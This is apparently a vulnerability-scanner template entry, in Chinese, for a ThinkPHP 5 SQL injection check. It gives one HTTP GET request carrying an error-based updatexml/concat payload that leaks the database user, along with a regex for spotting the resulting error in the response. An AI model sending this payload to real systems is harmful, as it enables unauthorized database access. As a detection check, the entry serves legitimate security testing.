﻿# thinkphp5_sqli

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1 HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：^(?=.*?syntax)(?=.*?error).*?$

> 上传文件定位：

> 验证文件来源：thinkphp5_sqli.poc
